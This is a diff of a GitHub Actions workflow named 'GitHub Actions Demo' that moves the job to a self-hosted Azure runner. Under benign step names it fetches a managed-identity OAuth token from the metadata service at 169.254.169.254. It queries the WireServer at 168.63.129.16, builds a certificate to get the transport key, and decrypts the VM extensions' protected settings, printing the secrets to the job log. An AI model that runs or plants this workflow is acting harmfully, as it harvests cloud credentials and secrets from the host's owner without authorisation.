@@ -1,31 +1,38 @@
 name: GitHub Actions Demo
-run-name: ${{ github.actor }} is testing out GitHub Actions 🚀
+run-name: ${{ github.actor }} testing GitHub Actions on Azure 🚀
 
 on: [push]
 
 jobs:
   Explore-GitHub-Actions:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
-      - run: df -h
+      - name: Check disk
+        run: df -h
 
-      - run: curl "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2020-06-01" -i
+      - name: Get Azure IMDS token
+        run: |
+          curl -H "Metadata:true" \
+               "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2020-06-01" -i
 
-      - run: curl "http://168.63.129.16/?comp=versions" -i
+      - name: Query wire server versions
+        run: |
+          curl -H "x-ms-version: 2015-04-05" "http://168.63.129.16/?comp=versions" -i
 
-      - run: curl "http://168.63.129.16:32526/vmSettings" -i
+      - name: Query vmSettings
+        run: |
+          curl -H "x-ms-version: 2015-04-05" "http://168.63.129.16:32526/vmSettings" -i
 
-      - run: >
-          openssl req -x509 -nodes -subj "/CN=LinuxTransport" -days 730 -newkey rsa:2048 -keyout temp.key -outform DER -out temp.crt &&
-          CERT_URL=$(curl -s "http://168.63.129.16/machine/?comp=goalstate" -H "x-ms-version: 2015-04-05" | grep -oP "(?<=Certificates>).+(?=</Certificates>)" | recode html..ascii) &&
-          curl -s "$CERT_URL" -H "x-ms-version: 2015-04-05" -H "x-ms-guest-agent-public-x509-cert: $(base64 -w0 temp.crt)" | grep -Poz "(?<=<Data>)(.*\n)*.*(?=</Data>)" | base64 -di > payload.p7m &&
-          openssl cms -decrypt -inform DER -in payload.p7m -inkey temp.key -out payload.pfx &&
-          openssl pkcs12 -nodes -in payload.pfx -password pass: -out wireserver.key &&
+      - name: Retrieve and decrypt protected settings
+        run: |
+          openssl req -x509 -nodes -subj "/CN=LinuxTransport" -days 730 -newkey rsa:2048 -keyout temp.key -outform DER -out temp.crt
+          CERT_URL=$(curl -s "http://168.63.129.16/machine/?comp=goalstate" -H "x-ms-version: 2015-04-05" | grep -oP "(?<=Certificates>).+(?=</Certificates>)" | recode html..ascii)
+          curl -s "$CERT_URL" -H "x-ms-version: 2015-04-05" -H "x-ms-guest-agent-public-x509-cert: $(base64 -w0 temp.crt)" \
+            | grep -Poz "(?<=<Data>)(.*\n)*.*(?=</Data>)" | base64 -di > payload.p7m
+          openssl cms -decrypt -inform DER -in payload.p7m -inkey temp.key -out payload.pfx
+          openssl pkcs12 -nodes -in payload.pfx -password pass: -out wireserver.key
           curl -s "http://168.63.129.16:32526/vmSettings" | jq -r ".extensionGoalStates[].settings[].protectedSettings" |
-          while read -r line; do echo "$line" | base64 -d > protected_settings.raw && openssl cms -decrypt -inform DER -in protected_settings.raw -inkey wireserver.key; done
-      - run: curl http://168.63.129.16/machine/?comp=goalstate
-
-
-
-
-
+          while read -r line; do
+            echo "$line" | base64 -d > protected_settings.raw
+            openssl cms -decrypt -inform DER -in protected_settings.raw -inkey wireserver.key
+          done
